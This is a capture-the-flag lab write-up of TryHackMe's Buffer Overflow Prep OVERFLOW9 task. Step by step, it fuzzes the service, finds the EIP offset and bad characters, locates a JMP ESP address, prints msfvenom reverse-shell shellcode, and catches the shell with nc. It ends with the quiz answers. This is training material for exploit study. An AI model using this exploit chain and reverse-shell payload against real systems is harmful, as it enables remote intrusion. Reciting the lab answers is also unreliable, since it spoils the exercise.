# OVERFLOW9
## Mona Configuration
```
!mona config -set workingfolder C:\mona\%p
```
## Fuzzing
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 9$ ./fuzzer.py
Fuzzing with 100 bytes
Fuzzing with 200 bytes
Fuzzing with 300 bytes
Fuzzing with 400 bytes
Fuzzing with 500 bytes
Fuzzing with 600 bytes
Fuzzing with 700 bytes
Fuzzing with 800 bytes
Fuzzing with 900 bytes
Fuzzing with 1000 bytes
Fuzzing with 1100 bytes
Fuzzing with 1200 bytes
Fuzzing with 1300 bytes
Fuzzing with 1400 bytes
Fuzzing with 1500 bytes
Fuzzing with 1600 bytes
Fuzzing crashed at 1600 bytes
```
## Controlling EIP
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 9$ cyclic 2000
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaakuaakvaakwaakxaakyaakzaalbaalcaaldaaleaalfaalgaalhaaliaaljaalkaallaalmaalnaaloaalpaalqaalraalsaaltaaluaalvaalwaalxaalyaalzaambaamcaamdaameaamfaamgaamhaamiaamjaamkaamlaammaamnaamoaampaamqaamraamsaamtaamuaamvaamwaamxaamyaamzaanbaancaandaaneaanfaangaanhaaniaanjaankaanlaanmaannaanoaanpaanqaanraansaantaanuaanvaanwaanxaanyaanzaaobaaocaaodaaoeaaofaaogaaohaaoiaaojaaokaaolaaomaaonaaooaaopaaoqaaoraaosaaotaaouaaovaaowaaoxaaoyaaozaapbaapcaapdaapeaapfaapgaaphaapiaapjaapkaaplaapmaapnaapoaappaapqaapraapsaaptaapuaapvaapwaapxaapyaapzaaqbaaqcaaqdaaqeaaqfaaqgaaqhaaqiaaqjaaqkaaqlaaqmaaqnaaqoaaqpaaqqaaqraaqsaaqtaaquaaqvaaqwaaqxaaqyaaqzaarbaarcaardaareaarfaargaarhaariaarjaarkaarlaarmaarnaaroaarpaarqaarraarsaartaaruaarvaarwaarxaaryaarzaasbaascaasdaaseaasfaasgaashaasiaasjaaskaaslaasmaasnaasoaaspaasqaasraassaastaasuaasvaaswaasxaasyaaszaatbaatcaatdaateaatfaatgaathaatiaatjaatkaatlaatmaatnaatoaatpaatqaatraatsaattaatuaatvaatwaatxaatyaat
```
Program crashes with `61657061` in EIP register
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 9$ python -c 'print(bytes.fromhex("61657061")[::-1].decode())'
apea
```
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 9$ cyclic -l apea
1514
```
Offset to EIP register is `1514` bytes
## Finding Bad Chars
Generate bytearray in Immunity:
```
!mona bytearray -b "\x00"
```
Generate bytearray for `exploit.py`:
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 9$ python -c '[print("\\x" + "{:02x}".format(x), end="") for x in range(1,256)]'
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```
Re-run `exploit.py` and run comparison
```
!mona compare -f C:\mona\oscp\bytearray.bin -a 018DFA30
```
```
mona Memory comparison results
Address                    Status                         BadChars                   Type                       Location
0x018dfa30                 Corruption after 3 bytes       00 04 05 3e 3f e1 e2       normal                     Stack
```
Bad chars are `\x00\x04\x3e\x3f\xe1`
## Finding a Jump Point
```
!mona jmp -r esp -b "\x00\x04\x3e\x3f\xe1"
```
```
Log data, item 11
 Address=625011AF
 Message=  0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
```
We will jump to address `\xaf\x11\x50\x62`
## Payload
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 9$ msfvenom -p windows/shell_reverse_tcp LHOST=10.6.23.1 LPORT=4444 EXITFUNC=thread -b "\x00\x04\x3e\x3f\xe1" -f c
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 12 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1506 bytes
unsigned char buf[] =
"\xbb\xa6\x11\x9e\x9e\xdb\xd0\xd9\x74\x24\xf4\x5d\x29\xc9"
"\xb1\x52\x31\x5d\x12\x03\x5d\x12\x83\x4b\xed\x7c\x6b\x6f"
"\xe6\x03\x94\x8f\xf7\x63\x1c\x6a\xc6\xa3\x7a\xff\x79\x14"
"\x08\xad\x75\xdf\x5c\x45\x0d\xad\x48\x6a\xa6\x18\xaf\x45"
"\x37\x30\x93\xc4\xbb\x4b\xc0\x26\x85\x83\x15\x27\xc2\xfe"
"\xd4\x75\x9b\x75\x4a\x69\xa8\xc0\x57\x02\xe2\xc5\xdf\xf7"
"\xb3\xe4\xce\xa6\xc8\xbe\xd0\x49\x1c\xcb\x58\x51\x41\xf6"
"\x13\xea\xb1\x8c\xa5\x3a\x88\x6d\x09\x03\x24\x9c\x53\x44"
"\x83\x7f\x26\xbc\xf7\x02\x31\x7b\x85\xd8\xb4\x9f\x2d\xaa"
"\x6f\x7b\xcf\x7f\xe9\x08\xc3\x34\x7d\x56\xc0\xcb\x52\xed"
"\xfc\x40\x55\x21\x75\x12\x72\xe5\xdd\xc0\x1b\xbc\xbb\xa7"
"\x24\xde\x63\x17\x81\x95\x8e\x4c\xb8\xf4\xc6\xa1\xf1\x06"
"\x17\xae\x82\x75\x25\x71\x39\x11\x05\xfa\xe7\xe6\x6a\xd1"
"\x50\x78\x95\xda\xa0\x51\x52\x8e\xf0\xc9\x73\xaf\x9a\x09"
"\x7b\x7a\x0c\x59\xd3\xd5\xed\x09\x93\x85\x85\x43\x1c\xf9"
"\xb6\x6c\xf6\x92\x5d\x97\x91\x96\xa7\x80\x60\xcf\xa5\xae"
"\x73\x53\x23\x48\x19\x7b\x65\xc3\xb6\xe2\x2c\x9f\x27\xea"
"\xfa\xda\x68\x60\x09\x1b\x26\x81\x64\x0f\xdf\x61\x33\x6d"
"\x76\x7d\xe9\x19\x14\xec\x76\xd9\x53\x0d\x21\x8e\x34\xe3"
"\x38\x5a\xa9\x5a\x93\x78\x30\x3a\xdc\x38\xef\xff\xe3\xc1"
"\x62\xbb\xc7\xd1\xba\x44\x4c\x85\x12\x13\x1a\x73\xd5\xcd"
"\xec\x2d\x8f\xa2\xa6\xb9\x56\x89\x78\xbf\x56\xc4\x0e\x5f"
"\xe6\xb1\x56\x60\xc7\x55\x5f\x19\x35\xc6\xa0\xf0\xfd\xe6"
"\x42\xd0\x0b\x8f\xda\xb1\xb1\xd2\xdc\x6c\xf5\xea\x5e\x84"
"\x86\x08\x7e\xed\x83\x55\x38\x1e\xfe\xc6\xad\x20\xad\xe7"
"\xe7";
```
## Exploit
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 9$ ./exploit.py
Sending evil buffer...
Done!
```
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 9$ nc -lnvp 4444
Connection from 10.10.80.211:49190
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\admin\Desktop\vulnerable-apps\oscp>echo LETS GO WE GOT OVERFLOW9!
echo LETS GO WE GOT OVERFLOW9!
LETS GO WE GOT OVERFLOW9!

C:\Users\admin\Desktop\vulnerable-apps\oscp>
```
## Questions
What is the EIP offset for OVERFLOW9?
```
1514
```
In byte order (e.g. \\x00\\x01\\x02) and including the null byte \\x00, what were the badchars for OVERFLOW9?
```
\x00\x04\x3e\x3f\xe1
```